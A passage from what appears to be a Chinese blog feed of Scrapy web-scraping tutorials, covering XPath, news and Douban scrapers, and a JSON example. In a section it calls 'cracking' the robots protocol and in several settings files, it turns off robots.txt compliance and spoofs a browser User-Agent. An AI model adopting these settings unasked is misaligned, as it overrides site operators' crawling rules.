class="hljs-string">&#x27;https://www.yicai.com/&#x27;</span> + data.xpath(<span class="hljs-string">&#x27;./@href&#x27;</span>).extract_first()<br>            title = data.xpath(<span class="hljs-string">&#x27;./div/div/h2/text()&#x27;</span>).extract_first()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(count) + <span class="hljs-string">&quot;. &quot;</span> + title + <span class="hljs-string">&quot;:&quot;</span> + url)<br>            count=count+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>修改设置文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Obey robots.txt rules</span><br>ROBOTSTXT_OBEY = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># Enable or disable downloader middlewares</span><br><span class="hljs-comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span><br>DOWNLOADER_MIDDLEWARES = &#123;<br>   <span class="hljs-string">&quot;dycj.middlewares.DycjDownloaderMiddleware&quot;</span>: <span class="hljs-number">543</span>,<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>运行爬虫项目</p></li></ul><h1 id="附json格式数据">附：JSON格式数据</h1><p>在Python中，你可以使用内置的 <code>json</code>模块来处理JSON数据。以下是一个简单的Python示例，演示如何将Python对象转换为JSON字符串（序列化）以及如何将JSON字符串转换为Python对象（反序列化）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 创建一个Python字典</span><br>person = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span>,<br>    <span class="hljs-string">&quot;isStudent&quot;</span>: <span class="hljs-literal">False</span>,<br>    <span class="hljs-string">&quot;grades&quot;</span>: [<span class="hljs-number">85</span>, <span class="hljs-number">90</span>, <span class="hljs-number">78</span>],<br>    <span class="hljs-string">&quot;address&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;street&quot;</span>: <span class="hljs-string">&quot;123 Main St&quot;</span>,<br>        <span class="hljs-string">&quot;zipCode&quot;</span>: <span class="hljs-string">&quot;10001&quot;</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># 将Python字典序列化为JSON字符串</span><br>json_string = json.dumps(person, indent=<span class="hljs-number">2</span>)  <span class="hljs-comment"># indent参数用于指定缩进空格数，使得生成的JSON字符串更易读</span><br><br><span class="hljs-comment"># 打印JSON字符串</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Serialized JSON:&quot;</span>)<br><span class="hljs-built_in">print</span>(json_string)<br><br><span class="hljs-comment"># 将JSON字符串反序列化为Python对象</span><br>parsed_person = json.loads(json_string)<br><br><span class="hljs-comment"># 打印反序列化后的Python对象</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nDeserialized Python object:&quot;</span>)<br><span class="hljs-built_in">print</span>(parsed_person)<br></code></pre></td></tr></table></figure><ul><li><code>json.dumps()</code> 用于将Python对象转换为JSON字符串。</li><li><code>json.loads()</code> 用于将JSON字符串转换为Python对象。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>网络爬虫案例实战</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy爬虫框架</title>
    <link href="/2023/12/14/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/12/14/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="引言">0. 引言</h1><p>Scrapy是一个高级Web爬虫框架，用于爬取网站并从其页面中提取结构化数据。它可以应用于数据挖掘、数据监控和自动化测试等多个方面。与之前讲过的Requests库和Selenium库不同，Scrapy更适合大批量的数据采集（类似于百度引擎），其内容相对复杂。</p><h1 id="scrapy框架基础">1. Scrapy框架基础</h1><p>所谓框架，可以理解成一个特殊的工具，它集成了许多事先编写好的常规代码，并做好了这些代码文件的连接，这样用户就可以专注于编写自己的任务中个性化部分的代码，无须自己编写常规代码。</p><ul><li>优点：异步、高并发、易于项目维护</li><li>缺点：代码编写较为复杂，在小规模数据爬取任务中优势不大</li></ul><h2 id="scrapy的安装方法">1.1 Scrapy的安装方法</h2><p>安装命令：<code>pip install scrapy</code></p><h2 id="scrapy的整体架构">1.2 Scrapy的整体架构</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312141127778.png"alt="image-20231214101522300" /><figcaption aria-hidden="true">image-20231214101522300</figcaption></figure><p><strong>核心组件：</strong></p><ul><li><code>Scrapy Engine</code>：核心引擎，负责控制和调度各个组件，保证数据流转；</li><li><code>Spiders</code>：我们自己编写的爬虫逻辑，定义抓取意图；</li><li><code>Scheduler</code>：负责管理任务、过滤任务、输出任务的调度器，存储、去重任务都在此控制；</li><li><code>Downloader</code>：下载器，负责在网络上下载数据，输入待下载的URL，输出下载结果；</li><li><code>Item Pipeline</code>：负责输出结构化数据，可自定义格式和输出的位置；</li><li><code>Downloader middlewares</code>：介于引擎和下载器之间，可以在网页在下载前、后进行逻辑处理；</li><li><code>Spider middlewares</code>：介于引擎和爬虫之间，在向爬虫输入下载结果前，和爬虫输出请求/ 数据后进行逻辑处理；</li></ul><p><strong>运行流程：</strong></p><ol type="1"><li><strong>引擎</strong>从<strong>自定义爬虫</strong>中获取初始化请求（也叫种子URL）；</li><li>引擎把该请求放入<strong>调度器</strong>中，同时向调度器获取待下载的请求；</li><li>调度器把<strong>待下载</strong>的请求发给引擎；</li><li>引擎发送请求给<strong>下载器</strong>，中间会经过一系列<strong>下载器中间件</strong>；</li><li>这个请求通过下载器下载完成后，生成一个<strong>响应对象</strong>，返回给引擎，这中间会再次经过一系列<strong>下载器中间件</strong>；</li><li>引擎接收到下载器返回的响应后，发送给爬虫，中间会经过一系列<strong>爬虫中间件</strong>，最后执行爬虫<strong>自定义的解析逻辑</strong>；</li><li>爬虫执行完自定义的解析逻辑后，生成<strong>结果对象</strong>或<strong>新的请求对象</strong>给引擎，再次经过一系列<strong>爬虫中间件</strong>；</li><li>引擎把爬虫返回的<strong>结果对象</strong>交由<strong>结果处理器</strong>处理，把<strong>新的请求</strong>通过引擎再交给<strong>调度器</strong>；</li><li>重复执行1-8，直到<strong>调度器</strong>中没有新的请求处理，任务结束；</li></ol><h2 id="scrapy常用指令">1.3 Scrapy常用指令</h2><ul><li><code>scrapy startproject projectName(项目名)</code>：创建爬虫项目</li><li><code>cd projectName(项目名)</code>：进入爬虫项目</li><li><code>scrapy genspider spiderName(爬虫名) xxx.com(域名)</code>：创建具体的爬虫文件</li><li><code>scrapy crawl spiderName(爬虫名)</code>：运行爬虫项目</li></ul><p>注：爬虫名不能和项目名相同</p><p><strong>关于初始爬虫文件：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BaiduSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;baidu&quot;</span> <span class="hljs-comment"># 爬虫文件名</span><br>    allowed_domains = [<span class="hljs-string">&quot;baidu.com&quot;</span>] <span class="hljs-comment"># 允许爬取的域名区域</span><br>    start_urls = [<span class="hljs-string">&quot;http://baidu.com/&quot;</span>] <span class="hljs-comment"># 爬取的初始url</span><br><br>    <span class="hljs-comment"># 用于实现爬虫逻辑的函数</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h1 id="xpath">2. Xpath</h1><h2 id="xpath简介">2.1 Xpath简介</h2><p>XPath 是 Scrapy 中常用的一种解析器，可以帮助爬虫定位和提取 HTML 或XML 文档中的数据。</p><h2 id="获取-html-元素">2.2 获取 HTML 元素</h2><p>在 HTML 文档中，每个元素都有自己的标签和属性。XPath可以通过标签名和属性名来定位和提取元素。下面是 XPath 获取 HTML元素的方法。</p><h3 id="获取标签元素">1. 获取标签元素</h3><p>获取 HTML 中的标签元素，可以使用标签名来定位。例如，要获取 HTML 中的<code>&lt;title&gt;</code> 标签的内容，可以使用如下 XPath 表达式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">//title/text() <br></code></pre></td></tr></table></figure><p>其中 <code>//</code> 表示在整个文档中查找，<code>title</code>表示要查找的标签名，<code>text()</code> 表示获取标签中的文本内容。</p><h3 id="获取属性元素">2. 获取属性元素</h3><p>获取 HTML 中的属性元素，可以使用 <code>@</code>符号加属性名来定位。例如，要获取 HTML 中所有 <code>&lt;a&gt;</code>标签的 <code>href</code> 属性的值，可以使用如下 XPath 表达式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">//a/@href <br></code></pre></td></tr></table></figure><p>其中 <code>//</code> 表示在整个文档中查找，<code>a</code>表示要查找的标签名，<code>@href</code> 表示要获取的属性名。</p><h3 id="获取-id-元素">3. 获取 ID 元素</h3><p>获取 HTML 中的 ID 元素，可以使用 <code>#</code> 符号加 ID值来定位。例如，要获取 HTML 中 ID 为 <code>mydiv</code> 的<code>&lt;div&gt;</code> 标签的内容，可以使用如下 XPath 表达式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">//*[@id=&quot;mydiv&quot;] <br></code></pre></td></tr></table></figure><p>其中 <code>*</code> 表示查找任意标签名，<code>@id="mydiv"</code>表示要查找 ID 属性值为 <code>mydiv</code> 的元素。</p><h3 id="获取-class-元素">4. 获取 class 元素</h3><p>获取 HTML 中的 class 元素，可以使用 <code>.</code> 符号加 class值来定位。例如，要获取 HTML 中 class 为 <code>myclass</code> 的<code>&lt;div&gt;</code> 标签的内容，可以使用如下 XPath 表达式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">//*[@class=&quot;myclass&quot;] <br></code></pre></td></tr></table></figure><p>其中 <code>*</code> 表示查找任意标签名，<code>@class="myclass"</code>表示要查找 class 属性值为 <code>myclass</code> 的元素。</p><h3 id="获取文本内容">5. 获取文本内容</h3><p>获取 HTML 元素的文本内容，可以使用 <code>text()</code> 或<code>string()</code> 方法。例如，要获取 HTML 中<code>&lt;div&gt;</code> 标签的文本内容，可以使用如下 XPath 表达式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">//div/text() <br></code></pre></td></tr></table></figure><p>其中 <code>//</code> 表示在整个文档中查找，<code>div</code>表示要查找的标签名，<code>text()</code> 表示获取标签中的文本内容。</p><h3 id="获取多个元素">6. 获取多个元素</h3><p>获取 HTML 中多个元素，可以使用 <code>[]</code>符号加序号或条件来定位。例如，要获取 HTML 中前三个<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性值，可以使用如下XPath 表达式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">//a[position()&lt;=3]/@href <br></code></pre></td></tr></table></figure><p>其中 <code>//</code> 表示在整个文档中查找，<code>a</code>表示要查找的标签名，<code>position()&lt;=3</code>表示定位前三个元素，<code>/@href</code> 表示要获取的属性名。</p><p>如果要获取符合某些条件的元素，可以使用逻辑运算符<code>and</code>、<code>or</code> 和 <code>not</code>。例如，要获取 HTML中 <code>class</code> 为 <code>myclass</code> 并且 <code>id</code> 为<code>mydiv</code> 的 <code>&lt;div&gt;</code>标签的文本内容，可以使用如下 XPath 表达式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">//div[@class=&quot;myclass&quot; and @id=&quot;mydiv&quot;]/text() <br></code></pre></td></tr></table></figure><p>其中 <code>//</code> 表示在整个文档中查找，<code>div</code>表示要查找的标签名，<code>[@class="myclass" and @id="mydiv"]</code>表示定位符合条件的元素，<code>text()</code>表示获取标签中的文本内容。</p><p>除了以上方法，XPath 还可以使用通配符<code>*</code>、<code>..</code>、<code>//</code>、<code>@*</code>等操作符来定位和提取 HTML 元素。掌握这些操作符可以更加灵活地使用XPath。</p><h2 id="示例代码">2.3 示例代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> scrapy <span class="hljs-keyword">import</span> Selector, Request<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;myspider&quot;</span><br>    start_urls = [<span class="hljs-string">&quot;http://example.com&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-comment"># 使用 Selector 类来解析 Response 对象</span><br>        selector = Selector(response)<br><br>        <span class="hljs-comment"># 使用 XPath 表达式来定位和提取数据</span><br>        title = selector.xpath(<span class="hljs-string">&quot;//title/text()&quot;</span>).extract_first()<br>        <span class="hljs-built_in">print</span>(title)<br></code></pre></td></tr></table></figure><h1 id="案例1百度新闻爬取">3. 案例1：百度新闻爬取</h1><h2 id="robots协议破解">3.1 Robots协议破解</h2><p>Robots协议的全称是<code>网络爬虫排除标准</code>（Robots ExclusionProtocol），又称为爬虫协议、机器人协议等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 修改settings.py，不遵守爬虫协议</span><br><span class="hljs-comment"># disobey robots.txt rules</span><br>ROBOTSTXT_OBEY = <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h2 id="user-agent设置">3.2 User-Agent设置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 修改settings.py</span><br><span class="hljs-comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span><br>USER_AGENT = (<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 &quot;</span><br>              <span class="hljs-string">&quot;Safari/537.36 Edg/120.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="输出信息设置">3.3 输出信息设置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 修改settings.py</span><br>LOG_LEVEL = <span class="hljs-string">&quot;WARNING&quot;</span><br></code></pre></td></tr></table></figure><ul><li>ERROR : 错误信息</li><li>WARNING : 警告信息</li><li>INFO : 一般信息</li><li>DEBUG : 调试信息</li></ul><h2 id="百度新闻标题爬取">3.4 百度新闻标题爬取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> scrapy <span class="hljs-keyword">import</span> Selector<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BaiduSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;baidu&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;baidu.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://www.baidu.com/s?rtt=1&amp;bsst=1&amp;cl=2&amp;tn=news&amp;word=阿里巴巴&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        selector = Selector(response)<br>        items = selector.xpath(<span class="hljs-string">&#x27;//*[@class=&quot;result-op c-container xpath-log new-pmd&quot;]/div/h3/a/@aria-label&#x27;</span>)<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>            <span class="hljs-built_in">print</span>(item.extract())<br></code></pre></td></tr></table></figure><h1 id="案例2新浪新闻爬取">4. 案例2：新浪新闻爬取</h1><p>在Scrapy的爬虫项目中，可以把不同功能的代码写在不同的python文件里，以便作为一个整体来运营和维护。通常把数据获取与解析的代码写在文件夹<code>spiders</code>下的爬虫文件中，把变量首先定义在实体文件中，把数据后续处理（如持久化存储）的代码写在管道文件中。</p><h2 id="实体文件设置">4.1 实体文件设置</h2><p><code>scrapy.Field()</code>可以理解为一个存储变量的区域，通过文件夹<code>spiders</code>里的爬虫文件获取到的内容都会存储到此处设置的区域里，然后以实体文件作为中转站，将这些变量传输到其他文件中，例如，传输到管道文件中进行数据存储等处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># items.py</span><br><span class="hljs-keyword">import</span> scrapy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">XinlangItem</span>(scrapy.Item):<br>    <span class="hljs-comment"># define the fields for your item here like:</span><br>    <span class="hljs-comment"># name = scrapy.Field()</span><br>    <span class="hljs-comment"># 标题、日期、来源</span><br>    title = scrapy.Field()<br>    time = scrapy.Field()<br>    source = scrapy.Field()<br></code></pre></td></tr></table></figure><h2 id="爬取一条新闻">4.2 爬取一条新闻</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># spiders/xina.py</span><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> xinlang.items <span class="hljs-keyword">import</span> XinlangItem<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">XinaSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;xina&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;xina.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://news.sina.com.cn/gov/2020-09-28/doc-iivhuipp6876829.shtml&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        item = XinlangItem()<br>        item[<span class="hljs-string">&#x27;title&#x27;</span>] = response.xpath(<span class="hljs-string">&#x27;//*[@class=&quot;main-title&quot;]/text()&#x27;</span>).extract_first()<br>        item[<span class="hljs-string">&#x27;time&#x27;</span>] = response.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;top_bar&quot;]/div/div[2]/span/text()&#x27;</span>).extract_first()<br>        item[<span class="hljs-string">&#x27;source&#x27;</span>] = response.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;top_bar&quot;]/div/div[2]/a/text()&#x27;</span>).extract_first()<br>        <span class="hljs-keyword">yield</span> item<br></code></pre></td></tr></table></figure><p><strong>return和yield的区别：</strong></p><ul><li>return：直接返回，不再执行函数内该语句后的代码</li><li>yield：返回后继续执行函数内该语句后的代码</li></ul><h2 id="爬取多条新闻">4.3 爬取多条新闻</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># # spiders/xina2.py</span><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> xinlang.items <span class="hljs-keyword">import</span> XinlangItem<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Xina2Spider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;xina2&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;xina.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://news.sina.com.cn/china/&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        item = XinlangItem()<br>        all_tag = response.xpath(<span class="hljs-string">&#x27;//*[@class=&quot;nav-list&quot;]/li&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(all_tag)<br>        tag_list = []<br>        <span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> all_tag:<br>            tag = tag.xpath(<span class="hljs-string">&#x27;./a/text()&#x27;</span>).extract_first()<br>            tag_list.append(tag)<br><br>        item[<span class="hljs-string">&#x27;title&#x27;</span>] = tag_list<br>        <span class="hljs-keyword">yield</span> item<br></code></pre></td></tr></table></figure><h2 id="持久化存储">4.4 持久化存储</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># settings.py文件中开启管道</span><br><span class="hljs-comment"># Configure item pipelines</span><br><span class="hljs-comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span><br>ITEM_PIPELINES = &#123;<br>   <span class="hljs-string">&quot;xinlang.pipelines.XinlangPipeline&quot;</span>: <span class="hljs-number">300</span>,<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pipelines.py</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">XinlangPipeline</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./xina.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-comment"># 充分体现实体文件数据中转站特性，无须专门导入Item类</span><br>            title = item[<span class="hljs-string">&#x27;title&#x27;</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(title)):<br>                f.write(<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;.&#x27;</span>+title[i]+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">return</span> item<br></code></pre></td></tr></table></figure><h1 id="案例3豆瓣电影画报图片爬取">5. 案例3：豆瓣电影画报图片爬取</h1><p>常规流程：</p><ul><li>创建项目、进入项目文件夹、创建爬虫文件</li><li>设置实体文件（建立要获取的字段）</li><li>修改设置文件（设置Robots协议和User-Agent，激活管道文件）</li><li>在文件夹<code>spiders</code>中编写爬虫逻辑（核心爬虫代码）</li><li>设置管道文件（爬后处理）</li></ul><h2 id="设置实体文件">5.1 设置实体文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DoubanItem</span>(scrapy.Item):<br>    url = scrapy.Field()  <span class="hljs-comment"># 封面网址</span><br>    name = scrapy.Field()  <span class="hljs-comment"># 电影名字</span><br></code></pre></td></tr></table></figure><h2 id="修改设置文件">5.2 修改设置文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span><br>USER_AGENT = (<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 &quot;</span><br>              <span class="hljs-string">&quot;Safari/537.36 Edg/120.0.0.0&quot;</span>)<br><br><span class="hljs-comment"># Obey robots.txt rules</span><br>ROBOTSTXT_OBEY = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 开启管道</span><br>ITEM_PIPELINES = &#123;<br>   <span class="hljs-string">&quot;douban.pipelines.DoubanPipeline&quot;</span>: <span class="hljs-number">300</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="编写爬虫逻辑">5.3 编写爬虫逻辑</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> douban.items <span class="hljs-keyword">import</span> DoubanItem<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DbSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;db&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;douban.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://movie.douban.com/top250&quot;</span>]<br>    <span class="hljs-comment"># 新增需要爬取的网页（2-10）</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>        start_urls.append(<span class="hljs-string">&quot;https://movie.douban.com/top250?start=&quot;</span>+<span class="hljs-built_in">str</span>(i*<span class="hljs-number">25</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        all_info = response.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;content&quot;]/div/div[1]/ol/li&#x27;</span>)<br>        title_list=[]<br>        img_url_list=[]<br>        <span class="hljs-comment"># 